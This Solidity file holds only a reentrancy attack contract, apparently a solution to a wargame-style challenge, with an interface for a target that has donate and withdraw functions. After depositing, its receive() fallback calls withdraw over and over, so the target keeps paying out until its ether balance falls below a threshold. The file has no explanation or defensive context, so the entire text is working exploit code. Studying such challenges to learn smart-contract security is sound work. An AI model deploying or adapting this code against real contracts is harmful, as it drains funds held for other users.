//pragma solidity ^0.6.12;
pragma solidity ^0.6.12;

contract AttackReentrance {
    address private _reentranceAddress;
    uint private myBalance = 0;
    Reentrance2 public reentrance;

    constructor(address reentranceAddress) public  {
        _reentranceAddress = reentranceAddress;
        reentrance = Reentrance2(_reentranceAddress);
    }

    function loadBalance() public payable {
        myBalance = msg.value;
        reentrance.donate{value: msg.value}(address(this));
    }

    function requestWithdraw() public {
        uint balance = address(_reentranceAddress).balance;
        if (balance >= 1000000 gwei) {
            reentrance.withdraw(myBalance);
        }
    }

    receive() external payable {
        requestWithdraw();
    }
}

abstract contract Reentrance2 {
    function donate(address _to) public virtual payable;
    function withdraw(uint _amount) public virtual;

}